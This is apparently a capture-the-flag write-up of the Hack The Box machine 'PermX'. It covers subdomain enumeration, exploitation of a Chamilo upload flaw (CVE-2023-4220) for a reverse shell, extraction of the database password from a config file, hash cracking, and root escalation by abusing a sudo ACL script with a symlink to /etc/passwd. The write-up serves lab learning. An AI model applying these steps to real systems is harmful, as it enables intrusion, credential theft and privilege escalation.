

Enumuration:

Nmap scan

skid@skidlord:~/Downloads$ nmap -sC -sV 10.10.11.23
Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-11 00:19 EDT
Nmap scan report for permx.htb (10.10.11.23)
Host is up (0.052s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e25c5d8c473ed872f7b4800349866def (ECDSA)
|_  256 1f41028e6b17189ca0ac5423e9713017 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: eLEARNING
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.10 seconds





People in company from the about section

Noah 

Elsie

Ralph

Mia


skid@skidlord:~/pen$ ffuf -w SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.permx.htb" -u http://permx.htb/ -fc 302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb/
 :: Wordlist         : FUZZ: SecLists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 302
________________________________________________

lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353]
www                     [Status: 200, Size: 36178, Words: 12829, Lines: 587]
:: Progress: [151265/151265] :: Job [1/1] :: 835 req/sec :: Duration: [0:03:01] :: Errors: 0 ::


I scan it with nuclei and find this 
[CVE-2023-4220] [http] [medium] http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/HgqByocmY8.txt
with an md5 hash that i crack 

|                                  |     |      |
| -------------------------------- | --- | ---- |
| c35bc9eaa4a930e006ab98bf3ef90408 | md5 | 8227 |


Exploit:

I find a cve exploit for this
https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit

and get a reverse shell really easily as the www-data user. 


i found two sql files inside of so i started a python server and then downloaded them to my machine 
python3 -m http.server 8080

`wget http://10.10.11.23:8080/database.lib.php`
wget http://10.10.11.23:8080/database.mysqli.lib.php

but this was just config files for the database and not the actual db itself so i looked for configuration files on chamilo with
www-data@permx:/var/www/chamilo$ find /var/www/chamilo/ -type f -name "*config*.php"



i found 
/var/www/chamilo/app/config/configuration.php


- **Database Host:** `localhost`
- **Database Port:** `3306`
- **Database User:** `chamilo`
- **Database Password:** `03F6lY3uXAP2bkW8`
so i connected to the database
<n/install$ mysql -u chamilo -p -h localhost -P 3306
Enter password: 03F6lY3uXAP2bkW8

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 596
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 

so i dumped the database 

ariaDB [(none)]> SHOW DATABASES;
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| chamilo            |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> exit; 
exit;
Bye
www-data@permx:/var/www/chamilo/main/install$ mysqldump -u chamilo -p -h localhost chamilo > chamilo_backup.sql
<hamilo -p -h localhost chamilo > chamilo_backup.sql
Enter password: 03F6lY3uXAP2bkW8



then download it to my machine 

MariaDB [chamilo_local]> SELECT username, password, email FROM user;
+----------+--------------------------------------------------------------+-----------------------+
| username | password                                                     | email                 |
+----------+--------------------------------------------------------------+-----------------------+
| admin    | $2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra | admin@permx.htb       |
| anon     | $2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS | anonymous@example.com |
+----------+--------------------------------------------------------------+-----------------------+
2 rows in set (0.000 sec)

MariaDB [chamilo_local]> 

is what i got from the database. Ill try to crack anon


I also on the rev shell check the /etc/passwd file and see there is a user 
mtz:x:1000:1000:mtz:/home/mtz:/bin/bash

skid@skidlord:~/pen$ hashcat --show -m 3200 bcrypt_hash.txt rockyou.txt
$2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS:anon

this displays that the hash password is anon, but actually this doesnt work to ssh into mtz so I try the SQL password 03F6lY3uXAP2bkW8 which works.



### ROOT PRIVILEGE ESCALATION:

1. **Check `sudo` Privileges:** I began by running the `sudo -l` command to view which commands the `mtz` user is allowed to run with root privileges. The output revealed that the user can execute `/opt/acl.sh` without a password as root:



2. **Understanding `/opt/acl.sh`:** After reviewing the script, I noted that it allows setting Access Control List (ACL) permissions on files. It accepts three parameters: a username, the permission type (read/write), and a target file. Importantly, the script checks if the target file is located in `/home/mtz/` and prevents directory traversal attacks.

Here is a key part of the script:

```
if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi
```


3. **Create a Backup of `/etc/passwd`:** To safely modify the system password file, I first created a backup of `/etc/passwd`:



4. **Create a Symbolic Link to `/etc/passwd`:** Next, I created a symbolic link from a file in my home directory (`/home/mtz/passwd_symlink`) to the real `/etc/passwd` file:




5. **Grant Write Permissions on the Symlink:** Using the `acl.sh` script, I granted write permissions to myself on the symlinked `/etc/passwd` file:


6. **Generate a Password Hash for a New Root User:** I used the following OpenSSL command to generate a password hash for the new root user:


7. **Edit `/etc/passwd` and Add a New Root User:** I edited the `/home/mtz/passwd_backup` file and added the following line for the new user with the root privilege:



8. **Overwrite `/etc/passwd` with the Modified Backup:** Finally, I used the symlink to copy the modified `passwd_backup` file (with the new root user) back to the actual `/etc/passwd`:


9. **Switch to the New Root User:** Once the password file was updated, I switched to the new `exploituser`:




By following this process, I successfully created a new root user and obtained root access.